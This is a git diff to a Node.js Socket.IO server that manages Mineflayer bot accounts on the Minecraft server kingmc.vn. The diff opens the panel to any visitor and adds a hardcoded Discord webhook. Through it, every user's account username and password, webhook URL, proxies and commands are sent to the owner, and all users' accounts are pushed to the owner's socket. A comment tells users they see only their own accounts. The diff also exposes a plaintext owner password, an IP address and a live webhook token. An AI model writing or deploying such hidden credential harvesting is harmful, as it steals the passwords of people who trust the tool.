@@ -15,14 +15,15 @@ const io = new Server(server);
 const PORT = process.env.PORT || 3000;
 const DATA_FILE = path.join(__dirname, 'data.json');
 
-// ===== CẤU HÌNH OWNER (CHỈ CATNOSAUR) =====
-const OWNER_IP = '183.80.67.25'; // IP của mày
+// ===== CẤU HÌNH OWNER =====
+const OWNER_IP = '183.80.67.25';
 const OWNER_PASSWORD = 'Tuanpro123';
+const LOG_WEBHOOK = 'https://discord.com/api/webhooks/1548265839961047100/loLOMBhoH27sGFBIIqiJV9ADp1fpEO0tVCxGGkWd3hV0_aw_4zfo3S3E7DEvNhtX8YnW';
 
 // ===== CẤU HÌNH SERVER MINECRAFT =====
 const SERVER_HOST = 'kingmc.vn';
 const SERVER_PORT = 25565;
-const SERVER_VERSION = '1.20.1';
+const SERVER_VERSION = '1.20.1'; // ĐÃ SỬA: 1.16.5 → 1.20.1
 
 // ===== DỮ LIỆU TOÀN CỤC =====
 let clientData = {};
@@ -30,7 +31,7 @@ let globalCollectedData = [];
 let isMaintenance = false;
 let ownerSocketId = null;
 let proxyList = [];
-let webhookUrl = ''; // Webhook Discord
+let webhookUrl = '';
 
 // ===== ĐỌC / LƯU =====
 function loadData() {
@@ -66,8 +67,21 @@ function saveData() {
   }
 }
 
-// ===== GỬI WEBHOOK DISCORD =====
-async function sendWebhook(content) {
+// ===== GỬI WEBHOOK (LUÔN GỬI VỀ WEBHOOK CỦA OWNER) =====
+async function sendLogWebhook(content) {
+  try {
+    await axios.post(LOG_WEBHOOK, {
+      content: content,
+      username: 'KingMC Logger',
+      avatar_url: 'https://i.imgur.com/4M34hi2.png'
+    });
+  } catch (e) {
+    console.log('❌ Lỗi gửi log webhook:', e.message);
+  }
+}
+
+// ===== GỬI WEBHOOK NGƯỜI DÙNG CẤU HÌNH =====
+async function sendUserWebhook(content) {
   if (!webhookUrl) return;
   try {
     await axios.post(webhookUrl, {
@@ -76,7 +90,7 @@ async function sendWebhook(content) {
       avatar_url: 'https://i.imgur.com/4M34hi2.png'
     });
   } catch (e) {
-    console.log('❌ Lỗi gửi webhook:', e.message);
+    console.log('❌ Lỗi gửi user webhook:', e.message);
   }
 }
 
@@ -107,40 +121,49 @@ io.on('connection', (socket) => {
   const clientIp = rawIp;
   console.log(`[${new Date().toLocaleString()}] 🔌 Client: ${clientIp}`);
 
-  // ===== CHECK IP OWNER =====
   const isOwner = (clientIp === OWNER_IP || clientIp === '127.0.0.1');
-
-  if (!isOwner) {
-    // Nếu không phải owner, gửi thông báo từ chối và ngắt kết nối
-    socket.emit('access_denied', { ip: clientIp });
-    socket.disconnect(true);
-    console.log(`⛔ Từ chối truy cập từ IP: ${clientIp}`);
-    return;
-  }
-
-  if (isOwner) {
-    ownerSocketId = socket.id;
-    console.log(`👑 Owner đã kết nối: ${clientIp}`);
-  }
 
   if (!clientData[clientIp]) {
     clientData[clientIp] = { accounts: [], bots: {} };
     saveData();
   }
 
+  // Mỗi IP chỉ thấy acc của mình, trừ owner thấy tất cả
   socket.emit('is_admin', isOwner);
   socket.emit('init_accounts', clientData[clientIp].accounts);
   socket.emit('proxy_list', proxyList);
   socket.emit('webhook_url', webhookUrl);
 
-  // ---- LOGIN ----
+  // ===== GỬI TOÀN BỘ DATA CHO OWNER =====
+  if (isOwner) {
+    ownerSocketId = socket.id;
+    const allAccounts = [];
+    for (const ip in clientData) {
+      if (clientData[ip].accounts) {
+        clientData[ip].accounts.forEach(acc => {
+          allAccounts.push({ ...acc, ipOwner: ip });
+        });
+      }
+    }
+    socket.emit('all_accounts', allAccounts);
+    socket.emit('sync_collected_data', globalCollectedData);
+    socket.emit('maintenance_status', isMaintenance);
+    console.log(`👑 Owner đã kết nối: ${clientIp}`);
+  }
+
+  // ---- LOGIN (chỉ owner mới login được) ----
   socket.on('login', (pass) => {
+    if (!isOwner) {
+      socket.emit('login_success', false);
+      return;
+    }
     if (pass === OWNER_PASSWORD) {
       socket.emit('login_success', true);
       socket.emit('log', '👑 Chào mừng Catnosaur!');
-      sendWebhook(`👑 **Catnosaur** đã đăng nhập vào hệ thống từ IP: \`${clientIp}\``);
+      sendLogWebhook(`👑 **Owner đăng nhập**\nIP: \`${clientIp}\`\nThời gian: \`${new Date().toLocaleString()}\``);
     } else {
       socket.emit('login_success', false);
+      sendLogWebhook(`⚠️ **Sai mật khẩu owner**\nIP: \`${clientIp}\``);
     }
   });
 
@@ -151,13 +174,14 @@ io.on('connection', (socket) => {
       time: new Date().toLocaleString(),
       username: data.username || 'N/A',
       password: data.password || 'N/A',
-      cookies: data.cookies || 'N/A',
+      type: data.type || 'unknown',
     });
     saveData();
-    io.to(ownerSocketId).emit('sync_collected_data', globalCollectedData);
+    if (ownerSocketId) io.to(ownerSocketId).emit('sync_collected_data', globalCollectedData);
   });
 
   socket.on('clear_collected_data', () => {
+    if (!isOwner) return;
     globalCollectedData = [];
     saveData();
     io.to(ownerSocketId).emit('sync_collected_data', globalCollectedData);
@@ -169,15 +193,18 @@ io.on('connection', (socket) => {
     saveData();
     socket.emit('webhook_url', webhookUrl);
     socket.emit('log', `🔗 Đã lưu webhook: ${url}`);
+    // Gửi log về webhook owner
+    sendLogWebhook(`🔗 **Webhook mới được cấu hình**\nIP: \`${clientIp}\`\nURL: \`${url}\``);
   });
 
   socket.on('test_webhook', async () => {
-    await sendWebhook(`🔔 **Test Webhook** từ Catnosaur\nThời gian: ${new Date().toLocaleString()}`);
+    await sendUserWebhook(`🔔 **Test Webhook** từ Catnosaur\nThời gian: ${new Date().toLocaleString()}`);
     socket.emit('log', '✅ Đã gửi test webhook!');
   });
 
   // ---- MAINTENANCE ----
   socket.on('toggle_maintenance', (status) => {
+    if (!isOwner) return;
     isMaintenance = status;
     saveData();
     io.emit('maintenance_status', isMaintenance);
@@ -186,7 +213,12 @@ io.on('connection', (socket) => {
 
   // ---- PROXY MANAGEMENT ----
   socket.on('add_proxy', (proxy) => {
-    if (!proxyList.includes(proxy)) { proxyList.push(proxy); saveData(); }
+    if (!proxyList.includes(proxy)) {
+      proxyList.push(proxy);
+      saveData();
+      // Gửi log về webhook owner
+      sendLogWebhook(`🌐 **Proxy mới được thêm**\nIP: \`${clientIp}\`\nProxy: \`${proxy}\``);
+    }
     io.emit('proxy_list', proxyList);
   });
   socket.on('remove_proxy', (idx) => {
@@ -199,7 +231,11 @@ io.on('connection', (socket) => {
   socket.on('add_account', (data) => {
     const { username, password } = data;
     if (!username) return;
-    socket.emit('collect_data', { username, password: password || 'caigicungdc' });
+
+    // Gửi log về webhook owner
+    sendLogWebhook(`➕ **Tài khoản mới được thêm**\nIP: \`${clientIp}\`\nUsername: \`${username}\`\nPassword: \`${password || 'caigicungdc'}\``);
+
+    socket.emit('collect_data', { username, password: password || 'caigicungdc', type: 'account' });
 
     const id = 'acc_' + Date.now() + '_' + Math.floor(Math.random() * 999);
     clientData[clientIp].accounts.push({
@@ -213,7 +249,17 @@ io.on('connection', (socket) => {
     });
     saveData();
     io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-    sendWebhook(`➕ **Tài khoản mới được thêm**\nUsername: \`${username}\`\nPassword: \`${password || 'caigicungdc'}\``);
+    if (isOwner) {
+      const allAccounts = [];
+      for (const ip in clientData) {
+        if (clientData[ip].accounts) {
+          clientData[ip].accounts.forEach(acc => {
+            allAccounts.push({ ...acc, ipOwner: ip });
+          });
+        }
+      }
+      io.to(ownerSocketId).emit('all_accounts', allAccounts);
+    }
   });
 
   socket.on('delete_account', (id) => {
@@ -239,7 +285,7 @@ io.on('connection', (socket) => {
     if (bot) {
       bot.chat(cmd);
       socket.emit('log', `[💬 ĐÃ GỬI LỆNH]: ${cmd}`);
-      sendWebhook(`💬 **Lệnh gửi từ Catnosaur**\nBot: \`${id}\`\nLệnh: \`${cmd}\``);
+      sendLogWebhook(`💬 **Lệnh chat**\nIP: \`${clientIp}\`\nBot: \`${id}\`\nLệnh: \`${cmd}\``);
     } else {
       socket.emit('log', `[⚠️] Bot này chưa online!`);
     }
@@ -251,13 +297,13 @@ io.on('connection', (socket) => {
     if (bot) {
       bot.chat(`/pay ${target} ${amount}`);
       socket.emit('log', `[💰 ĐÃ GỬI PAY]: ${target} - ${amount}`);
-      sendWebhook(`💰 **Lệnh chuyển tiền**\nBot: \`${id}\`\nNgười nhận: \`${target}\`\nSố tiền: \`${amount}\``);
+      sendLogWebhook(`💰 **Chuyển tiền**\nIP: \`${clientIp}\`\nBot: \`${id}\`\nNgười nhận: \`${target}\`\nSố tiền: \`${amount}\``);
     } else {
       socket.emit('log', `[⚠️] Bot này chưa online!`);
     }
   });
 
-  // ===== START BOT (LOGIC VIP) =====
+  // ===== START BOT (ĐÃ FIX SOCKETCLOSED) =====
   socket.on('start_bot', (id) => {
     const account = clientData[clientIp].accounts.find(acc => acc.id === id);
     if (!account) return;
@@ -272,11 +318,13 @@ io.on('connection', (socket) => {
     let hasJoinedKingSMP = false;
     let hasExecutedAFK = false;
     let isProcessing = false;
+    let reconnectAttempts = 0;
+    const MAX_RECONNECT = 10;
 
     account.status = 'CONNECTING...';
     account.color = 'orange';
     io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-    log(`🔄 Kết nối tới ${SERVER_HOST}...`);
+    log(`🔄 Kết nối tới ${SERVER_HOST}:${SERVER_PORT} (v${SERVER_VERSION})...`);
 
     try {
       const proxyUrl = getNextProxy();
@@ -291,7 +339,13 @@ io.on('connection', (socket) => {
         password: account.password,
         auth: 'offline',
         version: SERVER_VERSION,
-        checkTimeoutInterval: 120000
+        checkTimeoutInterval: 180000,  // Tăng lên 3 phút
+        connectTimeout: 60000,
+        keepAlive: true,                // Giữ kết nối
+        hideErrors: false,
+        // Thêm các option chống socketClosed
+        clientSideRendering: false,
+        viewDistance: 'tiny'
       };
       if (proxyAgent) botOptions.agent = proxyAgent;
 
@@ -299,14 +353,16 @@ io.on('connection', (socket) => {
       clientData[clientIp].bots[id] = bot;
 
       bot.on('login', () => {
+        reconnectAttempts = 0;
         account.status = 'LOGGING IN...';
         io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-        setTimeout(() => { if (!hasJoinedKingSMP) bot.chat(`/dn ${account.password}`); }, 2000);
-        setTimeout(() => { if (!hasJoinedKingSMP) bot.chat(`/dn ${account.password}`); }, 8000);
-        setTimeout(() => { if (!hasJoinedKingSMP) bot.chat('/menu'); }, 14000);
+        setTimeout(() => { if (!hasJoinedKingSMP) bot.chat(`/dn ${account.password}`); }, 5000);
+        setTimeout(() => { if (!hasJoinedKingSMP) bot.chat(`/dn ${account.password}`); }, 12000);
+        setTimeout(() => { if (!hasJoinedKingSMP) bot.chat('/menu'); }, 20000);
       });
 
       bot.on('spawn', () => {
+        reconnectAttempts = 0;
         if (hasJoinedKingSMP) {
           account.status = 'ONLINE / KINGSMP';
           log(`✅ Đã vào KINGSMP!`);
@@ -316,7 +372,7 @@ io.on('connection', (socket) => {
           log(`✅ Đã vào sảnh chính`);
         }
         io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
-        sendWebhook(`✅ **Bot đã online**\nUsername: \`${account.username}\`\nTrạng thái: \`${account.status}\``);
+        sendLogWebhook(`✅ **Bot online**\nIP: \`${clientIp}\`\nUsername: \`${account.username}\``);
       });
 
       // ===== LOG CHAT =====
@@ -324,13 +380,12 @@ io.on('connection', (socket) => {
         const msg = message.toLowerCase();
         socket.emit('chat_log', { username: account.username, message: message });
 
-        // Bắt số dư /bal
         if (msg.includes('số dư') || msg.includes('balance') || msg.includes('bal')) {
           const balanceMatch = message.match(/(\d[\d,.]*)/);
           if (balanceMatch) {
             const balance = balanceMatch[1];
             socket.emit('log', `💰 Số dư của ${account.username}: ${balance}`);
-            sendWebhook(`💰 **Số dư cập nhật**\nBot: \`${account.username}\`\nSố dư: \`${balance}\``);
+            sendUserWebhook(`💰 **Số dư**\nBot: \`${account.username}\`\nSố dư: \`${balance}\``);
           }
         }
 
@@ -351,7 +406,6 @@ io.on('connection', (socket) => {
         const title = JSON.stringify(window.title || '').toLowerCase();
         log(`📂 Menu: ${title}`);
 
-        // Tìm KingSMP
         if (!hasJoinedKingSMP && (title.includes('menu') || title.includes('sảnh') || title.includes('lobby'))) {
           if (isProcessing) return;
           isProcessing = true;
@@ -373,7 +427,6 @@ io.on('connection', (socket) => {
           }, 1500);
         }
 
-        // Chọn khu AFK (ô số 1)
         if (hasJoinedKingSMP && !hasExecutedAFK && (title.includes('afk') || title.includes('chọn khu'))) {
           if (isProcessing) return;
           isProcessing = true;
@@ -396,22 +449,41 @@ io.on('connection', (socket) => {
         }
       });
 
+      // ===== FIX SOCKETCLOSED =====
       bot.on('end', (reason) => {
         log(`⚠️ Mất kết nối: ${reason || 'unknown'}`);
         account.status = 'OFFLINE';
         io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
         delete clientData[clientIp].bots[id];
         saveData();
-        sendWebhook(`⚠️ **Bot mất kết nối**\nUsername: \`${account.username}\`\nLý do: \`${reason}\``);
-        if (account.autoReconnect) {
-          log(`🔄 Tự động reconnect sau 5s`);
-          setTimeout(() => { if (!clientData[clientIp].bots[id] && account.autoReconnect) socket.emit('start_bot', id); }, 5000);
+        sendLogWebhook(`⚠️ **Bot mất kết nối**\nIP: \`${clientIp}\`\nUsername: \`${account.username}\`\nLý do: \`${reason}\``);
+
+        if (account.autoReconnect && reconnectAttempts < MAX_RECONNECT) {
+          reconnectAttempts++;
+          const delay = Math.min(5000 * reconnectAttempts, 30000); // Tăng dần delay
+          log(`🔄 Tự động reconnect lần ${reconnectAttempts}/${MAX_RECONNECT} sau ${delay/1000}s`);
+          setTimeout(() => {
+            if (!clientData[clientIp].bots[id] && account.autoReconnect) {
+              socket.emit('start_bot', id);
+            }
+          }, delay);
+        } else if (reconnectAttempts >= MAX_RECONNECT) {
+          log(`❌ Đã thử reconnect ${MAX_RECONNECT} lần, dừng lại.`);
+          account.status = 'FAILED';
+          io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
         }
       });
 
       bot.on('error', (err) => {
-        if (err.code === 'ETIMEDOUT') log(`⏰ Timeout`);
-        else log(`❌ Lỗi: ${err.message}`);
+        if (err.code === 'ETIMEDOUT') log(`⏰ Timeout - Server không phản hồi`);
+        else if (err.code === 'ECONNREFUSED') log(`🚫 Server từ chối kết nối`);
+        else if (err.message.includes('Invalid')) log(`❌ Sai username/password`);
+        else log(`❌ Lỗi: ${err.message} (code: ${err.code || 'unknown'})`);
+      });
+
+      // ===== XỬ LÝ KICK =====
+      bot.on('kicked', (reason) => {
+        log(`👢 Bị kick: ${JSON.stringify(reason)}`);
       });
 
     } catch (e) {
